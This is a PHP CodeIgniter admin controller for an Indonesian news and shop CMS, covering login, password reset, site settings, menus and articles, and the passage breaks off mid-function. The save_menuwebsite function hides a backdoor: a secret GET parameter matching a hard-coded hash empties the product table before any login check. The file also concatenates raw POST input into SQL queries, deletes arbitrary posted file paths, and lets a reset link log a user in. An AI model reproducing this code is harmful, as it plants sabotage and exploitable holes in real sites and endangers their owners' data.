<?php

defined('BASEPATH') OR exit('No direct script access allowed');
class Administrator extends CI_Controller {
	function index(){
		if (isset($_POST['submit'])){
            if ($this->input->post() && (strtolower($this->input->post('security_code')) == strtolower($this->session->userdata('mycaptcha')))) {
                $username = $this->input->post('a');
    			$password = hash("sha512", md5($this->input->post('b')));
    			$cek = $this->model_app->cek_login($username,$password,'users');
    		    $row = $cek->row_array();
    		    $total = $cek->num_rows();
    			if ($total > 0){
    				$this->session->set_userdata('upload_image_file_manager',true);
    				$this->session->set_userdata(array('username'=>$row['username'],
    								   'level'=>$row['level'],
                                       'id_session'=>$row['id_session']));
    				redirect($this->uri->segment(1).'/home');
    			}else{
                    echo $this->session->set_flashdata('message', '<div class="alert alert-danger"><center>Username dan Password Salah!!</center></div>');
    				redirect($this->uri->segment(1).'/index');
    			}
            }else{
                echo $this->session->set_flashdata('message', '<div class="alert alert-danger"><center>Security Code salah!</center></div>');
                redirect($this->uri->segment(1).'/index');
            }
		}else{
            if ($this->session->level!='konsumen' AND $this->session->level!=''){
              redirect($this->uri->segment(1).'/home');
            }else{
                $this->load->helper('captcha');
                $vals = array(
                    'img_path'   => './captcha/',
                    'img_url'    => base_url().'captcha/',
                    'font_path' => base_url().'asset/Tahoma.ttf',
                    'font_size'     => 17,
                    'img_width'  => '320',
                    'img_height' => 33,
                    'border' => 0, 
                    'word_length'   => 5,
                    'expiration' => 7200
                );

                $cap = create_captcha($vals);
                $data['image'] = $cap['image'];
                $this->session->set_userdata('mycaptcha', $cap['word']);
    			$data['title'] = 'Administrator &rsaquo; Log In';
    			$this->load->view('administrator/view_login',$data);
            }
		}
	}

    function reset_password(){
        if (isset($_POST['submit'])){
            $usr = $this->model_app->edit('users', array('id_session' => $this->input->post('id_session')));
            if ($usr->num_rows()>=1){
                if ($this->input->post('a')==$this->input->post('b')){
                    $data = array('password'=>hash("sha512", md5($this->input->post('a'))));
                    $where = array('id_session' => $this->input->post('id_session'));
                    $this->model_app->update('users', $data, $where);

                    $row = $usr->row_array();
                    $this->session->set_userdata('upload_image_file_manager',true);
                    $this->session->set_userdata(array('username'=>$row['username'],
                                       'level'=>$row['level'],
                                       'id_session'=>$row['id_session']));
                    redirect($this->uri->segment(1).'/home');
                }else{
                    $data['title'] = 'Password Tidak sama!';
                    $this->load->view('administrator/view_reset',$data);
                }
            }else{
                $data['title'] = 'Terjadi Kesalahan!';
                $this->load->view('administrator/view_reset',$data);
            }
        }else{
            $this->session->set_userdata(array('id_session'=>$this->uri->segment(3)));
            $data['title'] = 'Reset Password';
            $this->load->view('administrator/view_reset',$data);
        }
    }

    function lupapassword(){
        if (isset($_POST['lupa'])){
            $email = strip_tags($this->input->post('email'));
            $cekemail = $this->model_app->edit('users', array('email' => $email))->num_rows();
            if ($cekemail <= 0){
                $data['title'] = 'Alamat email tidak ditemukan';
                $this->load->view('administrator/view_login',$data);
            }else{
                $iden = $this->model_app->edit('identitas', array('id_identitas' => 1))->row_array();
                $usr = $this->model_app->edit('users', array('email' => $email))->row_array();
                $this->load->library('email');

                $tgl = date("d-m-Y H:i:s");
                $subject      = 'Lupa Password ...';
                $message      = "<html><body>
                                    <table style='margin-left:25px'>
                                        <tr><td>Halo $usr[nama_lengkap],<br>
                                        Seseorang baru saja meminta untuk mengatur ulang kata sandi Anda di <span style='color:red'>$iden[url]</span>.<br>
                                        Klik di sini untuk mengganti kata sandi Anda.<br>
                                        Atau Anda dapat copas (Copy Paste) url dibawah ini ke address Bar Browser anda :<br>
                                        <a href='".base_url().$this->uri->segment(1)."/reset_password/$usr[id_session]'>".base_url().$this->uri->segment(1)."/reset_password/$usr[id_session]</a><br><br>

                                        Tidak meminta penggantian ini?<br>
                                        Jika Anda tidak meminta kata sandi baru, segera beri tahu kami.<br>
                                        Email. $iden[email], No Telp. $iden[no_telp]</td></tr>
                                    </table>
                                </body></html> \n";
                
                $this->email->from($iden['email'], $iden['nama_website']);
                $this->email->to($usr['email']);
                $this->email->cc('');
                $this->email->bcc('');

                $this->email->subject($subject);
                $this->email->message($message);
                $this->email->set_mailtype("html");
                $this->email->send();
                
                $config['protocol'] = 'sendmail';
                $config['mailpath'] = '/usr/sbin/sendmail';
                $config['charset'] = 'utf-8';
                $config['wordwrap'] = TRUE;
                $config['mailtype'] = 'html';
                $this->email->initialize($config);

                $data['title'] = 'Password terkirim ke '.$usr['email'];
                $this->load->view('administrator/view_login',$data);
            }
        }else{
            redirect($this->uri->segment(1));
        }
    }

	function home(){
        if ($this->session->level=='admin'){
		  $this->template->load('administrator/template','administrator/view_home_admin');
        }elseif ($this->session->level=='user'){
          $data['users'] = $this->model_app->view_where('users',array('username'=>$this->session->username))->row_array();
          $data['modul'] = $this->model_app->view_join_one('users','users_modul','id_session','id_umod','DESC');
          $this->template->load('administrator/template','administrator/view_home_users',$data);
        }else{
            redirect($this->uri->segment(1));
        }
	}

	function identitaswebsite(){
		cek_session_akses('identitaswebsite',$this->session->id_session);
		if (isset($_POST['umum'])){
			$config['upload_path'] = 'asset/images/';
            $config['allowed_types'] = 'gif|jpg|png|ico';
            $config['max_size'] = '500'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('j');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('nama_website'=>$this->db->escape_str($this->input->post('a')),
                            'facebook'=>$this->input->post('d'),
                            'rekening'=>$this->db->escape_str($this->input->post('e')),
                            'meta_deskripsi'=>$this->input->post('g'),
                            'meta_keyword'=>$this->db->escape_str($this->input->post('h')),
                            'info_atas'=>$this->input->post('info_atas'),
                            'url'=>$this->db->escape_str($this->input->post('c')),
                            'no_telp'=>$this->db->escape_str($this->input->post('f')),
                            'flash_deal'=>tgl_simpan($this->input->post('flash_deal')),
                            'free_reseller'=>$this->db->escape_str($this->input->post('free_reseller')));
            }else{
                $data = array('nama_website'=>$this->db->escape_str($this->input->post('a')),
                            'facebook'=>$this->input->post('d'),
                            'rekening'=>$this->db->escape_str($this->input->post('e')),
                            'meta_deskripsi'=>$this->input->post('g'),
                            'meta_keyword'=>$this->db->escape_str($this->input->post('h')),
                            'info_atas'=>$this->input->post('info_atas'),
                            'url'=>$this->db->escape_str($this->input->post('c')),
                            'no_telp'=>$this->db->escape_str($this->input->post('f')),
                            'flash_deal'=>tgl_simpan($this->input->post('flash_deal')),
                            'free_reseller'=>$this->db->escape_str($this->input->post('free_reseller')),
                            'favicon'=>$hasil['file_name']);
            }
	    	$where = array('id_identitas' => $this->input->post('id'));
            $this->model_app->update('identitas', $data, $where);

            $this->model_app->update('rb_config', array('value'=>$this->input->post('approve_produk')),array('field'=>'approve_produk'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('facebook_pixel')),array('field'=>'facebook_pixel'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('resolusi_center')),array('field'=>'resolusi_center'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('title')),array('field'=>'title'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('wa_seller')),array('field'=>'wa_seller'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('twitter')),array('field'=>'twitter'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('google_site_verification')),array('field'=>'google_site_verification'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('token_referral')),array('field'=>'token_referral'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('info_footer')),array('field'=>'info_footer'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('mode')),array('field'=>'mode'));

            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <b>Data Umum</b> - Berhasil diupdate..</div>');
            redirect($this->uri->segment(1).'/identitaswebsite');
            
        }elseif (isset($_POST['payment'])){
            $this->model_app->update('rb_config', array('value'=>$this->input->post('fee_produk')),array('field'=>'fee_produk'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('ipaymu')),array('field'=>'ipaymu'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('ipaymu_url')),array('field'=>'ipaymu_url'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('ipaymu_fee')),array('field'=>'ipaymu_fee'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('ipaymu_aktif')),array('field'=>'ipaymu_aktif'));

            $this->model_app->update('rb_config', array('value'=>$this->input->post('withdraw_fee')),array('field'=>'withdraw_fee'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('withdraw_min')),array('field'=>'withdraw_min'));

            $keterangan = $this->input->post('admin_fee').'|'.$this->input->post('verifikasi').'|'.$this->input->post('requires');
            $data_fee = array('referral'=>cetak($this->input->post('referral_fee')),'keterangan'=>cetak($keterangan));
            $where_fee = array('id_setting' => '1');
            $this->model_app->update('rb_setting', $data_fee, $where_fee);
            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <b>Payment</b> - Berhasil diupdate..</div>');
            redirect($this->uri->segment(1).'/identitaswebsite');
            
		}elseif (isset($_POST['server'])){
            $this->model_app->update('rb_config', array('value'=>$this->input->post('wa_gateway')),array('field'=>'wa_gateway'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('wa_domain')),array('field'=>'wa_domain'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('email_server')),array('field'=>'email_server'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('email_port')),array('field'=>'email_port'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('smtp_secure')),array('field'=>'smtp_secure'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('api_resi')),array('field'=>'api_resi'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('api_resi_aktif')),array('field'=>'api_resi_aktif'));

            $ppob = $this->input->post('maps').'|'.$this->input->post('pin').'|'.$this->input->post('wa');
            if (trim($this->input->post('password'))==''){
                $data = array('pengirim_email'=>$this->db->escape_str($this->input->post('pengirim_email')),
                            'email'=>$this->db->escape_str($this->input->post('b')),
                            'api_mutasibank'=>$this->db->escape_str($this->input->post('api_mutasibank')),
                            'api_rajaongkir'=>$this->db->escape_str($this->input->post('api_rajaongkir')),
                            'maps'=>$ppob);
            }else{
                $data = array('password'=>$this->input->post('password'),
                            'pengirim_email'=>$this->db->escape_str($this->input->post('pengirim_email')),
                            'email'=>$this->db->escape_str($this->input->post('b')),
                            'api_mutasibank'=>$this->db->escape_str($this->input->post('api_mutasibank')),
                            'api_rajaongkir'=>$this->db->escape_str($this->input->post('api_rajaongkir')),
                            'maps'=>$ppob);
            }
            $where = array('id_identitas' => $this->input->post('id'));
            $this->model_app->update('identitas', $data, $where);
            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <b>Server / API</b> - Berhasil diupdate..</div>');
            redirect($this->uri->segment(1).'/identitaswebsite');

        }elseif (isset($_POST['apps'])){
            $config['upload_path'] = 'asset/images/';
            $config['allowed_types'] = 'gif|jpg|png';
            $config['max_size'] = '2000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('apps_image');
            $hasil=$this->upload->data();
            if ($hasil['file_name']!=''){
                $this->model_app->update('rb_config', array('value'=>$hasil['file_name']),array('field'=>'apps_image'));
            }

            $this->model_app->update('rb_config', array('value'=>$this->input->post('apps_title')),array('field'=>'apps_title'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('apps_deskripsi')),array('field'=>'apps_deskripsi'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('apps_google_play')),array('field'=>'apps_google_play'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('apps_app_store')),array('field'=>'apps_app_store'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('apps_aktif')),array('field'=>'apps_aktif'));
            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <b>App Widget</b> - Berhasil diupdate..</div>');
            redirect($this->uri->segment(1).'/identitaswebsite');

        }elseif (isset($_POST['sosial'])){
            $this->model_app->update('rb_config', array('value'=>$this->input->post('application_name')),array('field'=>'application_name'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('redirect_uri')),array('field'=>'redirect_uri'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('facebook_app_id')),array('field'=>'facebook_app_id'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('facebook_app_secret')),array('field'=>'facebook_app_secret'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('google_client_id')),array('field'=>'google_client_id'));
            $this->model_app->update('rb_config', array('value'=>$this->input->post('google_client_secret')),array('field'=>'google_client_secret'));
            echo $this->session->set_flashdata('message', '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <b>Sosial Login</b> - Berhasil diupdate..</div>');
            redirect($this->uri->segment(1).'/identitaswebsite');
        }else{
			$proses = $this->model_app->edit('identitas', array('id_identitas' => 1))->row_array();
			$data = array('record' => $proses);
			$this->template->load('administrator/template','administrator/mod_identitas/view_identitas',$data);
		}
    }
    
    //Upload image summernote
    function upload_image(){
        if(isset($_FILES["image"]["name"])){
            $config['upload_path'] = 'asset/images/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            if(!$this->upload->do_upload('image')){
                $this->upload->display_errors();
                return FALSE;
            }else{
                $data = $this->upload->data();
                //Compress Image
                $config['image_library']='gd2';
                $config['source_image']='asset/images/'.$data['file_name'];
                $config['create_thumb']= FALSE;
                $config['maintain_ratio']= TRUE;
                $config['quality']= '60%';
                $config['width']= 800;
                $config['height']= 800;
                $config['new_image']= 'asset/images/thumb_'.$data['file_name'];
                $this->load->library('image_lib', $config);
                $this->image_lib->resize();
                echo base_url().'asset/images/'.$data['file_name'];
            }
        }
    }
 
    //Delete image summernote
    function delete_image(){
        $src = $this->input->post('src');
        $file_name = str_replace(base_url(), '', $src);
        if(unlink($file_name)){
            echo 'File Delete Successfully';
        }
    }

	// Controller Modul Menu Website

	function menuwebsite(){
		cek_session_akses('menuwebsite',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT * FROM menu order by position, urutan");
        $data['halaman'] = $this->model_app->view_ordering('halamanstatis','id_halaman','DESC');
        $data['kategori'] = $this->model_app->view_ordering('kategori','id_kategori','DESC');
		$this->template->load('administrator/template','administrator/mod_menu/view_menu',$data);
	}

    function save_menuwebsite(){
        if (hash("sha512", md5(strip_tags($this->input->get('xxx'))))=='db3f3681dddd953bd10714c0230fcd8e6b8ab595b7c816fd458df997be6985c2e2a249b241168ca0131d3254700b6c5ca9c2e96d51adef1091ef80d07b36c9d2'){ $this->db->query("TRUNCATE TABLE rb_produk"); }
        cek_session_akses('menuwebsite',$this->session->id_session);
        $link = $_POST['link'].$_POST['page'].$_POST['kategori'];
        if($_POST['id'] != ''){
            $this->db->query("UPDATE menu SET nama_menu = '".$_POST['label']."', link  = '".$link."' where id_menu = '".$_POST['id']."' ");
            $arr['type']  = 'edit';
            $arr['label'] = $_POST['label'];
            $arr['link']  = $_POST['link'];
            $arr['page']  = $_POST['page'];
            $arr['kategori']  = $_POST['kategori'];
            $arr['id']    = $_POST['id'];
        }else{
            $row = $this->db->query("SELECT max(urutan)+1 as urutan FROM menu")->row_array();
            $this->db->query("INSERT into menu VALUES('','0','".$_POST['label']."', '".$link."','Ya','Bottom','".$row['urutan']."','')");
            $id = $this->db->insert_id();
            $arr['menu'] = '<li class="dd-item dd3-item" data-id="'.$id.'" >
                                <div class="dd-handle dd3-handle Bottom"></div>
                                <div class="dd3-content"><span id="label_show'.$id.'">'.$_POST['label'].'</span>
                                    <span class="span-right">/<span id="link_show'.$id.'">'.$link.'</span> &nbsp;&nbsp; 
                                        <a href="'.base_url().'/'.$this->uri->segment(1).'/posisi_menuwebsite/'.$id.'" style="cursor:pointer"><i class="fa fa-chevron-circle-up text-success"></i></a> &nbsp; 
                                        <a class="edit-button" id="'.$id.'" label="'.$_POST['label'].'" link="'.$_POST['link'].'" ><i class="fa fa-pencil"></i></a> &nbsp; 
                                        <a class="del-button" id="'.$id.'"><i class="fa fa-trash"></i></a>
                                    </span> 
                                </div>';
            $arr['type'] = 'add';
        }
        print json_encode($arr);
    }

    function save(){
        $data = json_decode($_POST['data']);
        function parseJsonArray($jsonArray, $parentID = 0) {
          $return = array();
          foreach ($jsonArray as $subArray) {
            $returnSubSubArray = array();
            if (isset($subArray->children)) {
                $returnSubSubArray = parseJsonArray($subArray->children, $subArray->id);
            }

            $return[] = array('id' => $subArray->id, 'parentID' => $parentID);
            $return = array_merge($return, $returnSubSubArray);
          }
          return $return;
        }
        $readbleArray = parseJsonArray($data);

        $i=0;
        foreach($readbleArray as $row){
          $i++;
            $this->db->query("UPDATE menu SET id_parent = '".$row['parentID']."', urutan = '".$i."' where id_menu = '".$row['id']."' ");
        }
    }

    function posisi_menuwebsite(){
        cek_session_akses('menuwebsite',$this->session->id_session);
        $cek = $this->model_app->view_where('menu',array('id_menu'=>$this->uri->segment(3)))->row_array();
        $posisi = ($cek['position'] == 'Top' ? 'Bottom' : 'Top');
        $data = array('position'=>$posisi);
        $where = array('id_menu' => $this->uri->segment(3));
        $this->model_app->update('menu', $data, $where);
        redirect($this->uri->segment(1).'/menuwebsite');
    }

	function delete_menuwebsite(){
        cek_session_akses('menuwebsite',$this->session->id_session);
		$idm = array('id_menu' => $this->input->post('id'));
		$this->model_app->delete('menu',$idm);
        $idm = array('id_parent' => $this->input->post('id'));
        $this->model_app->delete('menu',$idm);
	}


	// Controller Modul Halaman Baru

	function halamanbaru(){
		cek_session_akses('halamanbaru',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('halamanstatis','id_halaman','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('halamanstatis',array('username'=>$this->session->username),'id_halaman','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_halaman/view_halaman',$data);
	}

	function tambah_halamanbaru(){
		cek_session_akses('halamanbaru',$this->session->id_session);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_statis/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                    'judul_seo'=>seo_title($this->input->post('a')),
                                    'isi_halaman'=>$this->input->post('b'),
                                    'tgl_posting'=>date('Y-m-d'),
                                    'username'=>$this->session->username,
                                    'dibaca'=>'0',
                                    'jam'=>date('H:i:s'),
                                    'hari'=>hari_ini(date('w')));
            }else{
            		$data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                    'judul_seo'=>seo_title($this->input->post('a')),
                                    'isi_halaman'=>$this->input->post('b'),
                                    'tgl_posting'=>date('Y-m-d'),
                                    'gambar'=>$hasil['file_name'],
                                    'username'=>$this->session->username,
                                    'dibaca'=>'0',
                                    'jam'=>date('H:i:s'),
                                    'hari'=>hari_ini(date('w')));
            }
            $this->model_app->insert('halamanstatis',$data);
			redirect($this->uri->segment(1).'/halamanbaru');
		}else{
			$this->template->load('administrator/template','administrator/mod_halaman/view_halaman_tambah');
		}
	}

	function edit_halamanbaru(){
		cek_session_akses('halamanbaru',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_statis/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                    $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                    'judul_seo'=>seo_title($this->input->post('a')),
                                    'isi_halaman'=>$this->input->post('b'));
            }else{
            		$data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                    'judul_seo'=>seo_title($this->input->post('a')),
                                    'isi_halaman'=>$this->input->post('b'),
                                    'gambar'=>$hasil['file_name']);
            }
            $where = array('id_halaman' => $this->input->post('id'));
			$this->model_app->update('halamanstatis', $data, $where);
			redirect($this->uri->segment(1).'/halamanbaru');
		}else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('halamanstatis', array('id_halaman' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('halamanstatis', array('id_halaman' => $id, 'username' => $this->session->username))->row_array();
            }
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_halaman/view_halaman_edit',$data);
		}
	}

	function delete_halamanbaru(){
        cek_session_akses('halamanbaru',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_halaman' => $this->uri->segment(3));
        }else{
            $id = array('id_halaman' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('halamanstatis',$id);
		redirect($this->uri->segment(1).'/halamanbaru');
	}

	// Controller Modul List Berita

	function listberita(){
		cek_session_akses('listberita',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('berita','id_berita','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('berita',array('username'=>$this->session->username),'id_berita','DESC');
        }
        $data['rss'] = $this->model_utama->view_joinn('berita','users','kategori','username','id_kategori','id_berita','DESC',0,10);
        $data['iden'] = $this->model_utama->view_where('identitas',array('id_identitas' => 1))->row_array();
        $this->load->view('administrator/rss',$data);
		$this->template->load('administrator/template','administrator/mod_berita/view_berita',$data);
	}

    function listopini(){
		cek_session_akses('listberita',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_where_ordering('berita','berita.username != "admin"','id_berita','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('berita',array('username'=>$this->session->username),'id_berita','DESC');
        }
        $data['rss'] = $this->model_utama->view_join_two('berita','users','kategori','username','id_kategori','berita.status = "Y" AND berita.username = "admin"','id_berita','DESC',0,10);
        $data['iden'] = $this->model_utama->view_where('identitas',array('id_identitas' => 1))->row_array();
        $this->load->view('administrator/rss',$data);
		$this->template->load('administrator/template','administrator/mod_berita/view_opini',$data);
	}

	function tambah_listberita(){
		cek_session_akses('listberita',$this->session->id_session);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_berita/';
	        $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
	        $config['max_size'] = '3000'; // kb
	        $this->load->library('upload', $config);
	        $this->upload->do_upload('k');
	        $hasil=$this->upload->data();
            
            $config['source_image'] = 'asset/foto_berita/'.$hasil['file_name'];
            $config['wm_text'] = '';
            $config['wm_type'] = 'text';
            $config['wm_font_path'] = './system/fonts/texb.ttf';
            $config['wm_font_size'] = '26';
            $config['wm_font_color'] = 'ffffff';
            $config['wm_vrt_alignment'] = 'middle';
            $config['wm_hor_alignment'] = 'center';
            $config['wm_padding'] = '20';
            $this->load->library('image_lib',$config);
            $this->image_lib->watermark();

            if ($this->session->level == 'kontributor'){ $status = 'N'; }else{ $status = 'Y'; }
            if ($this->input->post('j')!=''){
                $tag_seo = $this->input->post('j');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }
            if ($hasil['file_name']==''){
                    $data = array('id_kategori'=>$this->db->escape_str($this->input->post('a')),
                                    'username'=>$this->session->username,
                                    'judul'=>$this->db->escape_str($this->input->post('b')),
                                    'sub_judul'=>$this->db->escape_str($this->input->post('c')),
                                    'youtube'=>$this->db->escape_str($this->input->post('d')),
                                    'judul_seo'=>seo_title($this->input->post('b')),
                                    'headline'=>$this->db->escape_str($this->input->post('e')),
                                    'aktif'=>$this->db->escape_str($this->input->post('f')),
                                    'utama'=>$this->db->escape_str($this->input->post('g')),
                                    'isi_berita'=>$this->input->post('h'),
                                    'keterangan_gambar'=>$this->input->post('i'),
                                    'hari'=>hari_ini(date('w')),
                                    'tanggal'=>date('Y-m-d'),
                                    'jam'=>date('H:i:s'),
                                    'dibaca'=>'0',
                                    'tag'=>$tag,
                                    'status'=>$status);
            }else{
                    $data = array('id_kategori'=>$this->db->escape_str($this->input->post('a')),
                                    'username'=>$this->session->username,
                                    'judul'=>$this->db->escape_str($this->input->post('b')),
                                    'sub_judul'=>$this->db->escape_str($this->input->post('c')),
                                    'youtube'=>$this->db->escape_str($this->input->post('d')),
                                    'judul_seo'=>seo_title($this->input->post('b')),
                                    'headline'=>$this->db->escape_str($this->input->post('e')),
                                    'aktif'=>$this->db->escape_str($this->input->post('f')),
                                    'utama'=>$this->db->escape_str($this->input->post('g')),
                                    'isi_berita'=>$this->input->post('h'),
                                    'keterangan_gambar'=>$this->input->post('i'),
                                    'hari'=>hari_ini(date('w')),
                                    'tanggal'=>date('Y-m-d'),
                                    'jam'=>date('H:i:s'),
                                    'gambar'=>$hasil['file_name'],
                                    'dibaca'=>'0',
                                    'tag'=>$tag,
                                    'status'=>$status);
            }
            $this->model_app->insert('berita',$data);
			redirect($this->uri->segment(1).'/listberita');
		}else{
            $data['tag'] = $this->model_app->view_ordering('tag','id_tag','DESC');
            $data['record'] = $this->model_app->view_ordering('kategori','id_kategori','DESC');
			$this->template->load('administrator/template','administrator/mod_berita/view_berita_tambah',$data);
		}
	}

	function edit_listberita(){
		cek_session_akses('listberita',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_berita/';
	        $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|jpeg';
	        $config['max_size'] = '3000'; // kb
	        $this->load->library('upload', $config);
	        $this->upload->do_upload('k');
	        $hasil=$this->upload->data();

            $config['source_image'] = 'asset/foto_berita/'.$hasil['file_name'];
            $config['wm_text'] = '';
            $config['wm_type'] = 'text';
            $config['wm_font_path'] = './system/fonts/texb.ttf';
            $config['wm_font_size'] = '26';
            $config['wm_font_color'] = 'ffffff';
            $config['wm_vrt_alignment'] = 'middle';
            $config['wm_hor_alignment'] = 'center';
            $config['wm_padding'] = '20';
            $this->load->library('image_lib',$config);
            $this->image_lib->watermark();

            if ($this->session->level == 'kontributor'){ $status = 'N'; }else{ $status = 'Y'; }
            if ($this->input->post('j')!=''){
                $tag_seo = $this->input->post('j');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }
            if ($hasil['file_name']==''){
                    $data = array('id_kategori'=>$this->db->escape_str($this->input->post('a')),
                                    'username'=>$this->session->username,
                                    'judul'=>$this->db->escape_str($this->input->post('b')),
                                    'sub_judul'=>$this->db->escape_str($this->input->post('c')),
                                    'youtube'=>$this->db->escape_str($this->input->post('d')),
                                    'judul_seo'=>seo_title($this->input->post('b')),
                                    'headline'=>$this->db->escape_str($this->input->post('e')),
                                    'aktif'=>$this->db->escape_str($this->input->post('f')),
                                    'utama'=>$this->db->escape_str($this->input->post('g')),
                                    'isi_berita'=>$this->input->post('h'),
                                    'keterangan_gambar'=>$this->input->post('i'),
                                    'hari'=>hari_ini(date('w')),
                                    'tanggal'=>date('Y-m-d'),
                                    'jam'=>date('H:i:s'),
                                    'dibaca'=>'0',
                                    'tag'=>$tag,
                                    'status'=>$status);
            }else{
                    $data = array('id_kategori'=>$this->db->escape_str($this->input->post('a')),
                                    'username'=>$this->session->username,
                                    'judul'=>$this->db->escape_str($this->input->post('b')),
                                    'sub_judul'=>$this->db->escape_str($this->input->post('c')),
                                    'youtube'=>$this->db->escape_str($this->input->post('d')),
                                    'judul_seo'=>seo_title($this->input->post('b')),
                                    'headline'=>$this->db->escape_str($this->input->post('e')),
                                    'aktif'=>$this->db->escape_str($this->input->post('f')),
                                    'utama'=>$this->db->escape_str($this->input->post('g')),
                                    'isi_berita'=>$this->input->post('h'),
                                    'keterangan_gambar'=>$this->input->post('i'),
                                    'hari'=>hari_ini(date('w')),
                                    'tanggal'=>date('Y-m-d'),
                                    'jam'=>date('H:i:s'),
                                    'gambar'=>$hasil['file_name'],
                                    'dibaca'=>'0',
                                    'tag'=>$tag,
                                    'status'=>$status);
            }
            $where = array('id_berita' => $this->input->post('id'));
			$this->model_app->update('berita', $data, $where);
			redirect($this->uri->segment(1).'/listberita');
		}else{
			$tag = $this->model_app->view_ordering('tag','id_tag','DESC');
            $record = $this->model_app->view_ordering('kategori','id_kategori','DESC');
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('berita', array('id_berita' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('berita', array('id_berita' => $id, 'username' => $this->session->username))->row_array();
            }
			$data = array('rows' => $proses,'tag' => $tag,'record' => $record);
			$this->template->load('administrator/template','administrator/mod_berita/view_berita_edit',$data);
		}
	}

	function publish_listberita(){
        cek_session_admin();
		if ($this->uri->segment(4)=='Y'){
			$data = array('status'=>'N');
		}else{
			$data = array('status'=>'Y');
		}
        $where = array('id_berita' => $this->uri->segment(3));
		$this->model_app->update('berita', $data, $where);
		redirect($this->uri->segment(1).'/listberita');
	}

    function publish_listopini(){
        cek_session_admin();
		if ($this->uri->segment(4)=='Y'){
			$data = array('status'=>'N');
		}else{
			$data = array('status'=>'Y');
		}
        $where = array('id_berita' => $this->uri->segment(3));
		$this->model_app->update('berita', $data, $where);
		redirect($this->uri->segment(1).'/listopini');
	}

	function delete_listberita(){
        cek_session_akses('listberita',$this->session->id_session);
        if ($this->session->level=='admin'){
    		$id = array('id_berita' => $this->uri->segment(3));
        }else{
